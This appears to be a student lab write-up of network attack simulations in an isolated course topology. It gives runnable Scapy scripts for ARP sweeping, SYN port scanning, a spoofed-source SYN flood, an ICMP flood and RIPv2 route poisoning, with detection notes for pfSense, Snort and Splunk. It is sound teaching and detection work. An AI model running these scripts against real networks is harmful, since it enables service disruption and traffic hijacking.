 # Final project attacks
This document presents **traceable attack simulations** performed inside
the Secure Network Management (SNM) final project topology.

All attacks are executed in an **isolated
environment**, and designed to demonstrate:

-   Network reconnaissance techniques
-   Denial of Service mechanisms
-   Routing protocol abuse (RIP)
-   Remote attacker access via **VPN**
-   Detection and traceability via **pfSense + Snort + Splunk**

------------------------------------------------------------------------

## Context

### Attacker Machines

-   **Kali (Internal Attacker)** -- `192.168.40.46`
-   **Kali PC1** -- `192.168.40.118`
-   **Kali (External attacker)** -- `10.13.37.10` → *VPN client*

### Victim Systems

-   **Webserver (DMZ)** -- `192.168.40.14`
-   **pfSense Firewall** -- `192.168.40.1`
-   **LAB Routers (R1--R4)** -- RIP-enabled
-   **Windows XP (LAB)** -- `192.168.40.126`

------------------------------------------------------------------------

## VPN Connection

The **external attacker (10.13.37.10)** establishes a **Client-to-Site
VPN** connection to pfSense and receives an internal VPN IP `192.168.40.128/28`

From this point onward, the attacker behaves like an **internal host**,
but all traffic is: 
- Encapsulated (IPsec/OpenVPN) 
- Logged under **VPN
interface** 
- Traceable to an external origin

------------------------------------------------------------------------

## Prerequisites

``` bash
sudo apt update
sudo apt install -y python3-scapy tcpdump
sudo python3
```

All scripts must be executed with root privileges.

# RECONNAISSANCE ATTACKS

## Reconnaissance #1 - Full ARP Sweep + MAC Mapping

### Attacker
Kali (Internal Attacker) - `192.168.40.46`

### Victim
Entire Clients subnet - `192.168.40.32/28`

### Objective
Enumerate all live hosts and map IP → MAC relationships.

### Attack Code

``` python
from scapy.all import *

subnet = "192.168.40.32/28"
arp = ARP(pdst=subnet)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether / arp

answered, _ = srp(packet, timeout=3, verbose=False)

print("IP Address\tMAC Address")
for _, rcv in answered:
    print(f"{rcv.psrc}\t{rcv.hwsrc}")
```

### Expected Results
- Discovery of:
  - pfSense interface (`192.168.40.33`)
  - Kali SNM (`192.168.40.45`)
  - Other active hosts

### Tracing & Logs
- **pfSense**
  - Interface → Clients → Packet capture (ARP)
- **Snort**
  - Alert: *ARP Scan / Network Discovery*
- **Splunk**
  - Repeated ARP broadcasts from single source IP

------------------------------------------------------------------------

## Reconnaissance #2 - VPN-Based TCP SYN Scan (Remote Attacker)

### Attacker
Kali (External Attacker via VPN)
- Public IP: `10.13.37.10`
- VPN IP: `192.168.40.128`

### Victim
Webserver (DMZ) - `192.168.40.14`

### Objective
Demonstrate how a remote attacker, once connected via VPN, can perform
internal reconnaissance against protected DMZ resources.

### Attack Code

``` python
from scapy.all import *

target = "192.168.40.14"
ports = range(1, 1025)

for port in ports:
    syn = IP(dst=target)/TCP(dport=port, flags="S")
    resp = sr1(syn, timeout=0.3, verbose=False)

    if resp and resp.haslayer(TCP) and resp[TCP].flags == 18:
        print(f"[VPN SCAN] Port {port} OPEN")
        send(IP(dst=target)/TCP(dport=port, flags="R"), verbose=False)
```

### Expected Results
- Port **80** (HTTP) detected as open
- Scan appears to originate from VPN subnet
- No direct exposure of attacker's public IP to internal hosts

### Tracing & Logs

- **pfSense**
    - Interface: OpenVPN / IPsec
    - Source IP: `192.168.40.129`
- **Snort**
    - Signature: TCP SYN Scan
- **Splunk**
    - Correlation: VPN login event
    - Followed by port scan from same VPN IP

------------------------------------------------------------------------

# DENIAL OF SERVICE ATTACKS

## DoS #1 - TCP SYN Flood (Application-Level Exhaustion)

### Attacker
- Kali (Internal Attacker) – `192.168.40.46`

### Victim
- Webserver (DMZ) – `192.168.40.14`

### Objective
Exhaust webserver resources by creating massive half-open connections.

### Attack Code

``` python
from scapy.all import *
import random

target = "192.168.40.14"
port = 80

while True:
    ip = IP(src=f"192.168.40.{random.randint(50,100)}", dst=target)
    tcp = TCP(sport=random.randint(1024,65535), dport=port, flags="S")
    send(ip/tcp, verbose=False)
```

### Expected Results
- HTTP service becomes slow or unreachable
- New TCP connections fail

### Tracing & Logs
- **Snort**
  - Alert: *SYN Flood Detected*
- **pfSense**
  - State table exhaustion
- **Splunk**
  - Spike in TCP SYN events from spoofed IPs

------------------------------------------------------------------------

## DoS #2 – ICMP Flood (Network-Level DoS)

### Attacker
- **Kali (SNM)** – `192.168.40.45`

### Victim
- **Windows XP** – `192.168.40.126`

### Objective
Consume victim CPU and bandwidth via massive ICMP Echo Requests. 

### Attack Code

```python
from scapy.all import *

target = "192.168.40.126" # Windows XP IP
print(f"Starting ICMP Flood against {target} from Internal Network...")

packet = IP(dst=target)/ICMP()

send(packet, loop=1, inter=0.0005, verbose=False)
```

### Expected Results
- **Windows XP:** CPU usage hits 100%, system becomes unresponsive.

### Tracing & Logs
- **pfSense**
  - **Traffic Graph:** High bandwidth usage on both *Clients* (IN) and *LAB* (OUT) interfaces.
  - **States:** Rapid increase in ICMP states.
- **Snort**
  - Alert: *ICMP Ping Flood* or *Potentially Bad Traffic*.
- **Splunk**
  - Detection of anomalous ICMP volume from `192.168.40.46`.

------------------------------------------------------------------------

# ROUTING ATTACK

## RIP Attack – Malicious Route Injection

### Attacker
- **Kali (Internal Attacker)** – `192.168.40.46`

### Victim
- **LAB Routers (R1–R4)**
- **Network Observer:** Kali SNM (`192.168.40.45`)

### Objective
The attacker exploits RIPv2 (running on LAB routers) by injecting a fake route from the internal network. The goal is to poison the routing tables of R1-R4, forcing them to believe that the optimal path to the `192.168.40.0/24` network (or a specific target) is through the attacker's machine.

**Verification Goal:** We will use **Kali SNM** to monitor connectivity changes and validate that the route injection successfully disrupted the network logic.

### Attack Code

```python
from scapy.all import *

fake_route_net = "192.168.40.0" 
fake_route_mask = "255.255.255.0"

rip_packet = (
    IP(dst="224.0.0.9") /
    UDP(sport=520, dport=520) /
    RIP(cmd=2, version=2) /
    RIPEntry(
        addr=fake_route_net,
        mask=fake_route_mask,
        metric=1  # injecting a route with metric 1
    )
)

send(rip_packet, iface="eth0", loop=1, inter=5, verbose=True)
```

### Expected Results

**On Kali SNM (Observer):**
- **Before Attack:** A `traceroute 192.168.40.126` (Windows XP) shows a valid path through the gateway and LAB routers.
- **During Attack:** The path changes or times out because traffic is being misrouted towards the attacker.
- **Wireshark on Kali SNM:** You will see the malicious RIPv2 Response packets originating from `192.168.40.46`.

**On LAB Routers (VyOS):**
- The routing table (`show ip route`) updates to prefer the malicious route due to the lower metric.

### Tracing & Logs
- **pfSense**
  - Logs showing traffic for port 520 (UDP) crossing interfaces (if rules allow).
- **Snort**
  - Alert: *ET POLICY Routing Protocol (RIP) Update* or *Suspicious RIP traffic*.
- **Splunk**
  - Correlation event: "Routing topology change" followed by "Connection Timeouts" from Kali SNM.

------------------------------------------------------------------------


## Cleanup & Recovery

- Stop attack scripts (`CTRL+C`)
- Restore VM snapshots
- Clear pfSense states if needed:
```bash
Diagnostics → States → Reset States
```
